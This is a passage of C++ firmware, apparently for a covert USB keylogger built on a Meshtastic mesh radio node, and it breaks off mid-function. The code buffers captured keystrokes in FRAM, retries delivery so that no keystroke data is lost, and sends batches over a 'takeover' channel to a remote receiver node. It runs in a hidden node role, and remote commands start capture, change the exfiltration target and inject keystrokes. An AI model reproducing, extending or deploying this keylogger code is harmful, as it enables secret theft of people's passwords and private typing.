    uint32_t elapsed = millis() - pendingTx.send_time;

    /* Check if timeout expired */
    if (elapsed < pendingTx.timeout_ms) {
        return;  /* Still waiting, not timed out yet */
    }

    /* Timeout occurred */
    LOG_WARN("[USBCapture] ACK timeout for batch 0x%08x after %u ms (retry %u/%u)",
             pendingTx.batch_id, elapsed, pendingTx.retry_count + 1, ACK_MAX_RETRIES);

    /* Check if we have retries remaining */
    if (pendingTx.retry_count < ACK_MAX_RETRIES) {
        /* Attempt resend with exponential backoff */
        if (resendPendingBatch()) {
            /* Update tracking for next timeout check */
            pendingTx.send_time = millis();

            /* Double timeout (with cap) - NASA Rule 2: bounded values */
            uint32_t new_timeout = pendingTx.timeout_ms * ACK_BACKOFF_MULTIPLIER;
            if (new_timeout > ACK_MAX_TIMEOUT_MS) {
                new_timeout = ACK_MAX_TIMEOUT_MS;
            }
            pendingTx.timeout_ms = new_timeout;
            pendingTx.retry_count++;

            /* Track statistics */
            ack_retry_count++;

            LOG_INFO("ACK: Resent 0x%08x (timeout %ums)",
                     pendingTx.batch_id, pendingTx.timeout_ms);
        } else {
            /* Resend failed - treat as max retries reached */
            LOG_ERROR("ACK: Resend failed 0x%08x", pendingTx.batch_id);
            pendingTx.retry_count = ACK_MAX_RETRIES;  /* Force failure path */
        }
    }

    /* Check if max retries exceeded (may have been set above) */
    if (pendingTx.retry_count >= ACK_MAX_RETRIES) {
        /* v6.2: DON'T delete batch on failure - keep in FRAM and retry later
         * Batch will be retried on next runOnce() cycle (every 20 seconds)
         * This ensures we never lose keystroke data due to temporary network issues */
        LOG_WARN("ACK: Failed 0x%08x after %u retries - keeping",
                  pendingTx.batch_id, ACK_MAX_RETRIES);

        /* Track failure statistics */
        ack_timeout_count++;

        /* Clear pending state - next runOnce() will read from FRAM and try again
         * Reset retry count so we get fresh exponential backoff on next attempt */
        pendingTx.batch_id = 0;
        pendingTx.packet_id = 0;
        pendingTx.retry_count = 0;
        pendingTx.timeout_ms = ACK_TIMEOUT_INITIAL_MS;
    }
}

/**
 * @brief Resend the pending batch after timeout
 *
 * Re-reads batch from FRAM (it wasn't deleted) and retransmits with a new packet ID.
 * The batch_id remains the same for ACK correlation.
 *
 * NASA Power of 10 compliance:
 * - Fixed buffer sizes
 * - All return values checked
 * - Explicit error handling
 *
 * @return true if resend successful, false if error
 */
bool USBCaptureModule::resendPendingBatch()
{
    /* NASA Rule 5: Precondition check */
    assert(pendingTx.batch_id != 0);

    psram_keystroke_buffer_t buffer;
    bool have_data = false;

#ifdef HAS_FRAM_STORAGE
    /* Re-read batch from FRAM (it's still there since we didn't delete it) */
    if (framStorage != nullptr && framStorage->isInitialized()) {
        uint8_t fram_batch[FRAM_MAX_BATCH_SIZE];
        uint16_t actualLength = 0;

        if (framStorage->readBatch(fram_batch, sizeof(fram_batch), &actualLength)) {
            /* Unpack FRAM format: [start_epoch:4][final_epoch:4][data_length:2][flags:2][data:N] */
            if (actualLength >= 12) {
                memcpy(&buffer.start_epoch, &fram_batch[0], 4);
                memcpy(&buffer.final_epoch, &fram_batch[4], 4);
                memcpy(&buffer.data_length, &fram_batch[8], 2);
                memcpy(&buffer.flags, &fram_batch[10], 2);

                uint16_t data_len = actualLength - 12;
                if (data_len > PSRAM_BUFFER_DATA_SIZE) {
                    data_len = PSRAM_BUFFER_DATA_SIZE;  /* NASA Rule 2: bounded */
                }
                memcpy(buffer.data, &fram_batch[12], data_len);
                buffer.data_length = data_len;

                have_data = true;
            }
        }
    } else {
        /* Fall back to MinimalBatchBuffer (v7.0) */
        uint8_t minimal_batch[MINIMAL_BUFFER_DATA_SIZE];
        uint16_t actualLength = 0;
        uint32_t batchId = 0;

        if (minimal_buffer_read(minimal_batch, sizeof(minimal_batch), &actualLength, &batchId)) {
            if (actualLength >= 12) {
                memcpy(&buffer.start_epoch, &minimal_batch[0], 4);
                memcpy(&buffer.final_epoch, &minimal_batch[4], 4);
                memcpy(&buffer.data_length, &minimal_batch[8], 2);
                memcpy(&buffer.flags, &minimal_batch[10], 2);

                uint16_t data_len = actualLength - 12;
                if (data_len > PSRAM_BUFFER_DATA_SIZE) {
                    data_len = PSRAM_BUFFER_DATA_SIZE;
                }
                memcpy(buffer.data, &minimal_batch[12], data_len);
                buffer.data_length = data_len;

                have_data = true;
            }
        }
    }
#else
    /* Use MinimalBatchBuffer (v7.0) */
    uint8_t minimal_batch[MINIMAL_BUFFER_DATA_SIZE];
    uint16_t actualLength = 0;
    uint32_t batchId = 0;

    if (minimal_buffer_read(minimal_batch, sizeof(minimal_batch), &actualLength, &batchId)) {
        if (actualLength >= 12) {
            memcpy(&buffer.start_epoch, &minimal_batch[0], 4);
            memcpy(&buffer.final_epoch, &minimal_batch[4], 4);
            memcpy(&buffer.data_length, &minimal_batch[8], 2);
            memcpy(&buffer.flags, &minimal_batch[10], 2);

            uint16_t data_len = actualLength - 12;
            if (data_len > PSRAM_BUFFER_DATA_SIZE) {
                data_len = PSRAM_BUFFER_DATA_SIZE;
            }
            memcpy(buffer.data, &minimal_batch[12], data_len);
            buffer.data_length = data_len;

            have_data = true;
        }
    }
#endif

    if (!have_data) {
        LOG_ERROR("ACK: Read failed for resend");
        return false;
    }

    /* Decode buffer to text (same as initial send) */
    char decoded_text[MAX_DECODED_TEXT_SIZE];
    size_t text_len = decodeBufferToText(&buffer, decoded_text, sizeof(decoded_text));

    /* Send with same batch_id for ACK correlation */
    uint32_t newPacketId = sendToTargetNode((const uint8_t *)decoded_text, text_len, pendingTx.batch_id);

    if (newPacketId != 0) {
        /* Update packet ID for new transmission */
        pendingTx.packet_id = newPacketId;
        LOG_INFO("ACK: Resent 0x%08x as 0x%08x",
                 pendingTx.batch_id, newPacketId);
        return true;
    }

    LOG_ERROR("ACK: Resend TX failed");
    return false;
}

/**
 * @brief Handle incoming ACK response for pending transmission
 *
 * v7.5 format: "ACK:0x<batch_id>:!<sender_node>" (27 chars)
 * Legacy format: "ACK:0x<batch_id>" (14 chars) - backwards compatible
 * Deletes FRAM batch only after successful ACK match.
 *
 * NASA Power of 10 compliance:
 * - Fixed size buffers for parsing
 * - Bounds checking on all string operations
 * - Explicit error handling
 *
 * @param mp The received mesh packet (should be port 490)
 * @return true if this was a valid ACK for our pending batch
 */
bool USBCaptureModule::handleAckResponse(const meshtastic_MeshPacket &mp)
{
    /* Check if we're even waiting for an ACK */
    if (pendingTx.batch_id == 0) {
        return false;
    }

    /* Validate payload exists */
    if (mp.decoded.payload.size == 0) {
        return false;
    }

    /* ACK format (v7.5): "ACK:0x<8 hex>:!<8 hex>" (27 chars)
     * Legacy format: "ACK:0x<8 hex>" (14 chars)
     * Example v7.5: "ACK:0x12345678:!a1b2c3d4" */
    const size_t ACK_MIN_LEN = 6;    /* "ACK:0x" minimum */
    const size_t ACK_BATCH_LEN = 14; /* "ACK:0x12345678" */
    const size_t ACK_FULL_LEN = 27;  /* "ACK:0x12345678:!a1b2c3d4" */

    if (mp.decoded.payload.size < ACK_MIN_LEN) {
        return false;
    }

    /* Check ACK prefix (case-insensitive) */
    const char *payload = (const char *)mp.decoded.payload.bytes;

    /* NASA Rule 2: Bounded comparison */
    if (strncmp(payload, "ACK:0x", 6) != 0 &&
        strncmp(payload, "ack:0x", 6) != 0 &&
        strncmp(payload, "ACK:0X", 6) != 0) {
        return false;  /* Not an ACK packet */
    }

    /* Parse batch ID from hex string */
    if (mp.decoded.payload.size < ACK_BATCH_LEN) {
        LOG_WARN("ACK: Payload short %u bytes", mp.decoded.payload.size);
        return false;
    }

    /* Extract batch ID hex digits (8 chars after "ACK:0x") */
    char hex_str[9];  /* 8 hex digits + null */
    /* NASA Rule 2: Bounded copy */
    memcpy(hex_str, payload + 6, 8);
    hex_str[8] = '\0';

    /* Parse hex to uint32 */
    char *endptr;
    uint32_t acked_batch_id = strtoul(hex_str, &endptr, 16);

    /* Validate parsing succeeded */
    if (endptr != hex_str + 8) {
        LOG_WARN("ACK: Invalid batch hex %s", hex_str);
        return false;
    }

    /* v7.5: Parse optional sender node ID ":!<8 hex>" at offset 14 */
    if (mp.decoded.payload.size >= ACK_FULL_LEN &&
        payload[14] == ':' && payload[15] == '!') {
        /* Extract sender node hex digits */
        char sender_hex[9];
        memcpy(sender_hex, payload + 16, 8);
        sender_hex[8] = '\0';

        uint32_t sender_node = strtoul(sender_hex, &endptr, 16);

        /* Verify sender matches our expected receiver (targetNode) */
        if (targetNode != 0 && sender_node != targetNode) {
            LOG_DEBUG("ACK: Wrong receiver !%08x, expected !%08x",
                      sender_node, targetNode);
            return false;  /* ACK from different receiver - not for us */
        }
        LOG_DEBUG("ACK: Verified sender !%08x", sender_node);
    }
    /* Legacy format without sender ID - accept for backwards compatibility */

    /* Check if this ACK matches our pending batch */
    if (acked_batch_id != pendingTx.batch_id) {
        LOG_WARN("ACK: Mismatch got 0x%08x want 0x%08x",
                 acked_batch_id, pendingTx.batch_id);
        return false;
    }

    /* SUCCESS - ACK received for our pending batch! */
    uint32_t latency = millis() - pendingTx.send_time;
    LOG_INFO("ACK: OK 0x%08x (%ums, %u retries)",
             pendingTx.batch_id, latency, pendingTx.retry_count);

#ifdef HAS_FRAM_STORAGE
    /* NOW safe to delete batch from FRAM */
    if (framStorage != nullptr && framStorage->isInitialized()) {
        if (framStorage->deleteBatch()) {
            LOG_INFO("ACK: Deleted 0x%08x from FRAM", pendingTx.batch_id);
        } else {
            LOG_ERROR("ACK: Delete failed 0x%08x", pendingTx.batch_id);
        }
    } else {
        /* Delete from MinimalBatchBuffer (v7.0 fallback) */
        if (minimal_buffer_delete()) {
            LOG_INFO("ACK: Deleted 0x%08x from buffer", pendingTx.batch_id);
        } else {
            LOG_WARN("ACK: Buffer already empty (0x%08x)", pendingTx.batch_id);
        }
    }
#else
    /* Delete from MinimalBatchBuffer (v7.0) */
    if (minimal_buffer_delete()) {
        LOG_INFO("ACK: Deleted 0x%08x from buffer", pendingTx.batch_id);
    } else {
        LOG_WARN("ACK: Buffer already empty (0x%08x)", pendingTx.batch_id);
    }
#endif

    /* Track success statistics */
    ack_success_count++;

    /* Clear pending state to allow next batch */
    pendingTx.batch_id = 0;
    pendingTx.packet_id = 0;

    return true;
}

// ============================================================================
// MESH MODULE API IMPLEMENTATION
// ============================================================================

/**
 * @brief Check if a command requires authentication
 * @param cmd Command to check
 * @return true if command requires auth (when auth is enabled)
 */
static bool commandRequiresAuth(USBCaptureCommand cmd)
{
    /* Sensitive commands that can affect capture state require auth */
    switch (cmd) {
        case CMD_START:
        case CMD_STOP:
        case CMD_TEST:
            return true;
        default:
            /* Read-only commands allowed without auth: STATUS, STATS, DUMP */
            return false;
    }
}

/**
 * @brief Check if authentication is enabled
 * @return true if USB_CAPTURE_AUTH_TOKEN is defined and non-empty
 */
static bool isAuthEnabled()
{
    const char *token = USB_CAPTURE_AUTH_TOKEN;
    return (token != nullptr && token[0] != '\0');
}

/**
 * @brief Validate auth token in command
 *
 * Expects format: "AUTH:<token>:<command>"
 * Example: "AUTH:mysecret:START"
 *
 * @param payload Raw command payload
 * @param len Payload length
 * @param cmdStart Output: pointer to command portion after auth prefix (if valid)
 * @param cmdLen Output: length of command portion
 * @return true if auth valid, false if invalid
 */
static bool validateAuth(const uint8_t *payload, size_t len,
                         const uint8_t **cmdStart, size_t *cmdLen)
{
    /* NASA Rule 4: Validate all inputs */
    assert(payload != nullptr);
    assert(cmdStart != nullptr);
    assert(cmdLen != nullptr);

    /* Check for AUTH: prefix */
    if (len < USB_CAPTURE_AUTH_PREFIX_LEN ||
        strncmp((const char *)payload, USB_CAPTURE_AUTH_PREFIX, USB_CAPTURE_AUTH_PREFIX_LEN) != 0) {
        return false;
    }

    /* Find token end (next ':' after "AUTH:") */
    const uint8_t *tokenStart = payload + USB_CAPTURE_AUTH_PREFIX_LEN;
    size_t remaining = len - USB_CAPTURE_AUTH_PREFIX_LEN;
    size_t tokenLen = 0;

    /* NASA Rule 2: Fixed loop bound */
    for (size_t i = 0; i < remaining && i < USB_CAPTURE_AUTH_MAX_TOKEN_LEN; i++) {
        if (tokenStart[i] == ':') {
            tokenLen = i;
            break;
        }
    }

    /* Token not found (no trailing ':') */
    if (tokenLen == 0 || tokenLen >= remaining) {
        return false;
    }

    /* Compare token with configured value */
    const char *expectedToken = USB_CAPTURE_AUTH_TOKEN;
    size_t expectedLen = strlen(expectedToken);

    if (tokenLen != expectedLen ||
        strncmp((const char *)tokenStart, expectedToken, tokenLen) != 0) {
        LOG_WARN("Auth: Invalid token");
        return false;
    }

    /* Auth valid - set command pointers (skip "AUTH:<token>:") */
    *cmdStart = tokenStart + tokenLen + 1;  /* +1 for trailing ':' */
    *cmdLen = remaining - tokenLen - 1;

    return true;
}

ProcessMessage USBCaptureModule::handleReceived(const meshtastic_MeshPacket &mp)
{
    /* All packets arrive on port 490 (USB_CAPTURE_PORTNUM)
     * v7.3: Module now registered for port 490 to receive ACKs
     *
     * Packet types:
     * - ACK responses: "ACK:0x<batch_id>" from KeylogReceiverModule
     * - Commands: STATUS, START, STOP, STATS, DUMP from canned messages
     *
     * REQ-SEC-001: Authenticated command format: "AUTH:<token>:<command>"
     */

    /* Try to handle as ACK first */
    if (handleAckResponse(mp)) {
        return ProcessMessage::STOP;  /* ACK handled */
    }

    /* REQ-SEC-001: Check for authenticated command format */
    const uint8_t *cmdPayload = mp.decoded.payload.bytes;
    size_t cmdLen = mp.decoded.payload.size;
    bool hasValidAuth = false;

    if (isAuthEnabled()) {
        /* Try to extract auth and get command portion */
        const uint8_t *authCmdStart = nullptr;
        size_t authCmdLen = 0;

        if (validateAuth(cmdPayload, cmdLen, &authCmdStart, &authCmdLen)) {
            /* Auth valid - use command portion for parsing */
            cmdPayload = authCmdStart;
            cmdLen = authCmdLen;
            hasValidAuth = true;
        }
        /* If auth prefix present but invalid, original payload used for parsing
         * This allows read-only commands to work without auth */
    }

    /* Parse command (from either authenticated or raw payload) */
    USBCaptureCommand cmd = parseCommand(cmdPayload, cmdLen);

    /* If it's not a recognized command, let other modules handle it */
    if (cmd == CMD_UNKNOWN) {
        return ProcessMessage::CONTINUE;
    }

    /* REQ-SEC-001: Check if command requires authentication */
    if (isAuthEnabled() && commandRequiresAuth(cmd) && !hasValidAuth) {
        LOG_WARN("Auth: Required for %s from 0x%08x",
                 cmd == CMD_START ? "START" : cmd == CMD_STOP ? "STOP" : "TEST",
                 mp.from);

        /* Send auth required response */
        char response[MAX_COMMAND_RESPONSE_SIZE];
        size_t len = snprintf(response, sizeof(response), "AUTH_REQUIRED: Use AUTH:<token>:<command>");

        myReply = router->allocForSending();
        if (myReply) {
            myReply->decoded.portnum = static_cast<meshtastic_PortNum>(USB_CAPTURE_PORTNUM);
            myReply->decoded.payload.size = len;
            memcpy(myReply->decoded.payload.bytes, response, len);
        }
        return ProcessMessage::STOP;
    }

    LOG_INFO("Cmd: From 0x%08x%s", mp.from, hasValidAuth ? " (auth)" : "");

    /* Capture sender as target node for direct messages (auto-capture mode) */
    if (targetNode == 0) {
        targetNode = mp.from;
        LOG_INFO("Cmd: Target=0x%08x (auto)", targetNode);
    } else if (targetNode != mp.from) {
        LOG_DEBUG("Cmd: From 0x%08x (target=0x%08x)", mp.from, targetNode);
    }

    /* Execute command */
    char response[MAX_COMMAND_RESPONSE_SIZE];
    size_t len = executeCommand(cmd, cmdPayload, cmdLen,
                                response, sizeof(response));

    /* Send response directly as broadcast on Channel 1 (v7.8)
     * Bypass framework's sendResponse() mechanism to avoid PKI override.
     * Broadcast responses use Channel 1 PSK - same security as keystroke batches.
     * Only devices with Channel 1 PSK can decrypt responses. */
    if (len > 0) {
        meshtastic_MeshPacket *p = router->allocForSending();
        if (p) {
            p->decoded.portnum = static_cast<meshtastic_PortNum>(USB_CAPTURE_PORTNUM);
            p->decoded.payload.size = len;
            memcpy(p->decoded.payload.bytes, response, len);

            // Broadcast configuration (matches keystroke batch pattern)
            p->to = NODENUM_BROADCAST;  // Broadcast to all on channel
            p->channel = USB_CAPTURE_CHANNEL_INDEX;  // Channel 1 "takeover"
            p->pki_encrypted = false;  // Use Channel PSK, not PKI
            p->want_ack = false;  // Broadcasts don't use mesh ACK
            p->priority = meshtastic_MeshPacket_Priority_DEFAULT;
            p->decoded.request_id = mp.id;  // Link to original request

            // Send directly, bypassing framework's response mechanism
            service->sendToMesh(p, RX_SRC_LOCAL, false);

            LOG_INFO("Cmd: Broadcast reply %zu bytes on Ch=%u (requestId=0x%08x)",
                     len, p->channel, mp.id);
        } else {
            LOG_ERROR("Cmd: Alloc failed");
        }
    }

    // Don't set myReply - we sent directly
    return ProcessMessage::STOP;  /* Skip other modules */
}

USBCaptureCommand USBCaptureModule::parseCommand(const uint8_t *payload, size_t len)
{
    /* Validate inputs (v3.5) */
    if (!payload || len == 0 || len > MAX_COMMAND_LENGTH) {
        return CMD_UNKNOWN;
    }

    /* Validate payload contains only printable ASCII (prevent malformed packets) */
    for (size_t i = 0; i < len; i++) {
        if (payload[i] < PRINTABLE_CHAR_MIN || payload[i] >= PRINTABLE_CHAR_MAX) {
            LOG_WARN("Cmd: Invalid char at %zu", i);
            return CMD_UNKNOWN;
        }
    }

    /* Convert to uppercase for case-insensitive matching */
    char cmd[MAX_COMMAND_LENGTH];
    size_t cmd_len = (len < sizeof(cmd) - 1) ? len : sizeof(cmd) - 1;

    for (size_t i = 0; i < cmd_len; i++) {
        cmd[i] = toupper(payload[i]);
    }
    cmd[cmd_len] = '\0';

    /* Match command */
    if (strncmp(cmd, "STATUS", 6) == 0) {
        return CMD_STATUS;
    } else if (strncmp(cmd, "START", 5) == 0) {
        return CMD_START;
    } else if (strncmp(cmd, "STOP", 4) == 0) {
        return CMD_STOP;
    } else if (strncmp(cmd, "STATS", 5) == 0) {
        return CMD_STATS;
    } else if (strncmp(cmd, "DUMP", 4) == 0) {
        return CMD_DUMP;
    } else if (strncmp(cmd, "TEST", 4) == 0) {
        return CMD_TEST;
    }
    // Command Center commands (v7.8)
    else if (strncmp(cmd, "FRAM_CLEAR", 10) == 0) {
        return CMD_FRAM_CLEAR;
    } else if (strncmp(cmd, "FRAM_STATS", 10) == 0) {
        return CMD_FRAM_STATS;
    } else if (strncmp(cmd, "FRAM_COMPACT", 12) == 0) {
        return CMD_FRAM_COMPACT;
    } else if (strncmp(cmd, "SET_INTERVAL", 12) == 0) {
        return CMD_SET_INTERVAL;
    } else if (strncmp(cmd, "SET_TARGET", 10) == 0) {
        return CMD_SET_TARGET;
    } else if (strncmp(cmd, "FORCE_TX", 8) == 0) {
        return CMD_FORCE_TX;
    } else if (strncmp(cmd, "RESTART_CORE1", 13) == 0) {
        return CMD_RESTART_CORE1;
    } else if (strncmp(cmd, "CORE1_HEALTH", 12) == 0) {
        return CMD_CORE1_HEALTH;
    }

    return CMD_UNKNOWN;
}

size_t USBCaptureModule::executeCommand(USBCaptureCommand cmd, const uint8_t *payload, size_t payload_len,
                                        char *response, size_t max_len)
{
    switch (cmd) {
        case CMD_STATUS:
            return getStatus(response, max_len);

        case CMD_START:
            capture_enabled = true;
            return snprintf(response, max_len, "USB Capture STARTED");

        case CMD_STOP:
            capture_enabled = false;
            return snprintf(response, max_len, "USB Capture STOPPED");

        case CMD_STATS:
            return getStats(response, max_len);

        case CMD_DUMP:
            /* Log MinimalBatchBuffer state (v7.0) */
            LOG_DEBUG("Cmd: Buffer %u/%u",
                      minimal_buffer_count(), MINIMAL_BUFFER_SLOTS);
            return snprintf(response, max_len, "Buffer dump: %u/%u slots used",
                           minimal_buffer_count(), MINIMAL_BUFFER_SLOTS);

        case CMD_TEST:
        {
            /* Extract test text after "TEST " prefix
             * Format: "TEST hello world" -> inject "hello world"
             */
            const char *cmd_prefix = "TEST ";
            size_t prefix_len = 5;  // Length of "TEST "

            /* Find start of test text (skip case-insensitive "TEST " prefix) */
            const char *text_start = NULL;
            size_t text_len = 0;

            /* Case-insensitive search for "TEST " prefix */
            if (payload_len > prefix_len)
            {
                /* Check if payload starts with "TEST " (case-insensitive) */
                bool prefix_match = true;
                for (size_t i = 0; i < prefix_len - 1; i++)  // -1 to exclude the space for now
                {
                    char c = toupper(payload[i]);
                    if (c != cmd_prefix[i])
                    {
                        prefix_match = false;
                        break;
                    }
                }

                /* If prefix matches and there's a space or we're at the text */
                if (prefix_match)
                {
                    /* Skip "TEST" and any whitespace */
                    size_t offset = 4;  // Length of "TEST"
                    while (offset < payload_len && (payload[offset] == ' ' || payload[offset] == '\t'))
                    {
                        offset++;
                    }

                    /* Remaining text is what we inject */
                    if (offset < payload_len)
                    {
                        text_start = (const char *)&payload[offset];
                        text_len = payload_len - offset;
                    }
                }
            }

            /* Inject text if we found any */
            if (text_start && text_len > 0)
            {
                /* Validate payload size */
                if (text_len > MAX_TEST_PAYLOAD_SIZE) {
                    return snprintf(response, max_len, "TEST: Payload too large (%zu bytes, max %d)",
                                   text_len, MAX_TEST_PAYLOAD_SIZE);
                }

                /* Call Core1's injection function */
                keyboard_decoder_core1_inject_text(text_start, text_len);

                return snprintf(response, max_len, "TEST: Injected %zu bytes", text_len);
            }
            else
            {
                return snprintf(response, max_len, "TEST: No text provided. Usage: TEST <text>");
            }
        }

        // Command Center commands (v7.8)
        case CMD_FRAM_CLEAR:
#ifdef HAS_FRAM_STORAGE
            if (framStorage) {
                uint8_t batch_count = framStorage->getBatchCount();
                framStorage->format();
                return snprintf(response, max_len, "FRAM cleared (%u batches deleted)", batch_count);
            }
#endif
            return snprintf(response, max_len, "FRAM not available");

        case CMD_FRAM_STATS:
#ifdef HAS_FRAM_STORAGE
            if (framStorage) {
                return snprintf(response, max_len,
                    "FRAM: %u batches, %u bytes free (%u%% used), %u evictions",
                    framStorage->getBatchCount(),
                    framStorage->getAvailableSpace(),
                    framStorage->getUsagePercentage(),
                    framStorage->getEvictionCount());
            }
#endif
            return snprintf(response, max_len, "FRAM not available");

        case CMD_FRAM_COMPACT:
#ifdef HAS_FRAM_STORAGE
            if (framStorage) {
                // FRAM doesn't need compaction (no fragmentation), but we can trigger eviction
                uint32_t evicted = framStorage->getEvictionCount();
                return snprintf(response, max_len, "FRAM: No compaction needed (evictions: %u)", evicted);
            }
#endif
            return snprintf(response, max_len, "FRAM not available");

        case CMD_SET_INTERVAL:
        {
            // Parse interval from payload: "SET_INTERVAL 60000"
            const char *interval_str = strchr((const char *)payload, ' ');
            if (interval_str) {
                interval_str++;  // Skip space
                uint32_t interval = atoi(interval_str);
                if (interval >= TX_INTERVAL_MIN_MS && interval <= TX_INTERVAL_MAX_MS) {
                    // Note: Current implementation uses random interval, so this would require
                    // adding a configurable interval member variable
                    return snprintf(response, max_len,
                        "SET_INTERVAL: Not implemented (currently random %u-%ums)",
                        TX_INTERVAL_MIN_MS, TX_INTERVAL_MAX_MS);
                } else {
                    return snprintf(response, max_len,
                        "SET_INTERVAL: Invalid range (must be %u-%u ms)",
                        TX_INTERVAL_MIN_MS, TX_INTERVAL_MAX_MS);
                }
            }
            return snprintf(response, max_len, "SET_INTERVAL: Usage: SET_INTERVAL <ms>");
        }

        case CMD_SET_TARGET:
        {
            // Parse node ID from payload: "SET_TARGET 0x12345678"
            const char *node_str = strchr((const char *)payload, ' ');
            if (node_str) {
                node_str++;  // Skip space
                NodeNum newTarget = strtoul(node_str, NULL, 0);  // Supports 0x hex format
                if (newTarget > 0) {
                    targetNode = newTarget;
                    return snprintf(response, max_len, "Target node set to 0x%08x", targetNode);
                } else {
                    return snprintf(response, max_len, "SET_TARGET: Invalid node ID");
                }
            }
            return snprintf(response, max_len, "SET_TARGET: Usage: SET_TARGET <nodeId>");
        }

        case CMD_FORCE_TX:
        {
            // Clear pending transmission to allow immediate send
            if (pendingTx.batch_id != 0) {
                return snprintf(response, max_len, "FORCE_TX: Batch 0x%08x already pending", pendingTx.batch_id);
            }
            // Force transmission by calling processPSRAMBuffers()
            processPSRAMBuffers();
            if (pendingTx.batch_id != 0) {
                return snprintf(response, max_len, "FORCE_TX: Sent batch 0x%08x", pendingTx.batch_id);
            } else {
                return snprintf(response, max_len, "FORCE_TX: No batches available");
            }
        }

        case CMD_RESTART_CORE1:
        {
            // Core1 restart not safely supported (requires full device reboot)
            // RP2040/RP2350 multicore_launch_core1() has no safe stop mechanism
            return snprintf(response, max_len,
                "RESTART_CORE1: Not supported (requires device reboot)");
        }

        case CMD_CORE1_HEALTH:
        {
            extern core1_health_metrics_t g_core1_health;  // From common.h

            const char *status_str = "UNKNOWN";
            switch (g_core1_health.status) {
                case CORE1_STATUS_OK: status_str = "OK"; break;
                case CORE1_STATUS_STALLED: status_str = "STALLED"; break;
                case CORE1_STATUS_ERROR: status_str = "ERROR"; break;
                case CORE1_STATUS_STOPPED: status_str = "STOPPED"; break;
            }

            uint32_t now = millis();
            uint32_t last_capture_ago = (now - g_core1_health.last_capture_time_ms) / 1000;  // seconds

            return snprintf(response, max_len,
                "Core1: %s USB:%s %us | Keys:%u Err:%u Buf:%u",
                status_str,
                g_core1_health.usb_connected ? "Y" : "N",
                last_capture_ago,
                g_core1_health.capture_count,
                g_core1_health.error_count,
                g_core1_health.buffer_finalize_count);
        }

        case CMD_UNKNOWN:
        default:
            return snprintf(response, max_len,
                "UNKNOWN. Valid: STATUS, START, STOP, STATS, DUMP, TEST, "
                "FRAM_CLEAR, FRAM_STATS, FRAM_COMPACT, SET_INTERVAL, SET_TARGET, "
                "FORCE_TX, RESTART_CORE1, CORE1_HEALTH");
    }
}

size_t USBCaptureModule::getStatus(char *response, size_t max_len)
{
    /* Determine role name for display */
    const char *role_name = "UNKNOWN";
    if (owner.role == meshtastic_Config_DeviceConfig_Role_CLIENT_HIDDEN) {
        role_name = "HIDDEN";
    } else if (owner.role == meshtastic_Config_DeviceConfig_Role_CLIENT) {
        role_name = "CLIENT";
    } else if (owner.role == meshtastic_Config_DeviceConfig_Role_ROUTER) {
        role_name = "ROUTER";
    }

    /* Format target node display */
    char target_str[20];
    if (targetNode == 0) {
        snprintf(target_str, sizeof(target_str), "NONE");
    } else {
        snprintf(target_str, sizeof(target_str), "0x%08x", targetNode);
    }

    return snprintf(response, max_len,
        "Node: %s | Role: %s | Capture: %s | Target: %s | Buffers: %u/%u",
        owner.long_name,
        role_name,
        capture_enabled ? "ON" : "OFF",
        target_str,
        minimal_buffer_count(),
        MINIMAL_BUFFER_SLOTS
    );
}

size_t USBCaptureModule::getStats(char *response, size_t max_len)
{
    /* NASA Power of 10: Bounded output with defensive max_len check */
    if (max_len == 0) {
        return 0;
    }

    /* REQ-OPS-001: Read Core1 health metrics with memory barrier */
    __dmb();
    uint32_t last_capture_ms = g_core1_health.last_capture_time_ms;
    uint32_t capture_count = g_core1_health.capture_count;
    uint32_t error_count = g_core1_health.error_count;
    uint32_t finalize_count = g_core1_health.buffer_finalize_count;
    uint8_t usb_connected = g_core1_health.usb_connected;
    uint8_t status = g_core1_health.status;
    __dmb();

    /* Calculate time since last capture */
    uint32_t now = millis();
    uint32_t secs_since_capture = (last_capture_ms > 0) ?
        (now - last_capture_ms) / 1000 : 0;

    /* Status string mapping */
    const char *status_str;
    switch (status) {
        case CORE1_STATUS_OK:      status_str = "OK"; break;
        case CORE1_STATUS_STALLED: status_str = "STALLED"; break;
        case CORE1_STATUS_ERROR:   status_str = "ERROR"; break;
        case CORE1_STATUS_STOPPED: status_str = "STOPPED"; break;
        default:                   status_str = "UNKNOWN"; break;
    }

    /* REQ-STOR-005: Get FRAM eviction statistics */
    uint32_t fram_evictions = 0;
#ifdef HAS_FRAM_STORAGE
    if (framStorage != nullptr && framStorage->isInitialized()) {
        fram_evictions = framStorage->getEvictionCount();
    }
#endif

    return snprintf(response, max_len,
        "Core1: %s USB:%s %lus | Keys:%lu Err:%lu Buf:%lu | "
        "ACK: %lu ok %lu fail %lu retry | Evict:%lu | %s",
        status_str,
        usb_connected ? "Y" : "N",
        (unsigned long)secs_since_capture,
        (unsigned long)capture_count,
        (unsigned long)error_count,
        (unsigned long)finalize_count,
        (unsigned long)ack_success_count,
        (unsigned long)ack_timeout_count,
        (unsigned long)ack_retry_count,
        (unsigned long)fram_evictions,
        capture_enabled ? "ON" : "OFF"
    );
}

#ifdef USB_CAPTURE_SIMULATE_KEYS
// ==================== Simulation Mode Implementation ====================

/**
 * @brief Test messages for simulation mode
 *
 * These messages simulate typing patterns for testing the full pipeline.
 * Each message will be written as a separate FRAM batch.
 */
static const char *SIM_TEST_MESSAGES[] = {
    "Hello from XIAO simulation mode! Testing ACK system.",
    "This is batch #2 with some test keystrokes for validation.",
    "Testing special chars: user@email.com password123!",
    "Final test batch - checking end-to-end delivery.",
    "Batch 5: The quick brown fox jumps over the lazy dog."
};
static const size_t SIM_MESSAGE_COUNT = sizeof(SIM_TEST_MESSAGES) / sizeof(SIM_TEST_MESSAGES[0]);

bool USBCaptureModule::simulateKeystrokes()
{
    // NASA Rule 4: Check preconditions
    if (!sim_enabled) {
        return false;
    }

    // Check if we've reached the batch limit (0 = infinite)
    if (SIM_BATCH_COUNT > 0 && sim_batch_count >= SIM_BATCH_COUNT) {
        if (sim_enabled) {
            LOG_INFO("Sim: Complete %lu batches",
                     (unsigned long)sim_batch_count);
            sim_enabled = false;
        }
        return false;
    }

    // Check timing interval
    uint32_t now = millis();
    if (now - sim_last_batch_time < SIM_INTERVAL_MS) {
        return false;  // Not time yet
    }

#ifdef HAS_FRAM_STORAGE
    if (framStorage == nullptr || !framStorage->isInitialized()) {
        LOG_ERROR("Sim: FRAM unavailable");
        return false;
    }

    // Select message based on batch count (cycle through messages)
    size_t msg_index = sim_batch_count % SIM_MESSAGE_COUNT;
    const char *message = SIM_TEST_MESSAGES[msg_index];
    size_t msg_len = strlen(message);

    // NASA Rule 2: Enforce fixed bounds
    if (msg_len > SIM_MAX_MESSAGE_LEN) {
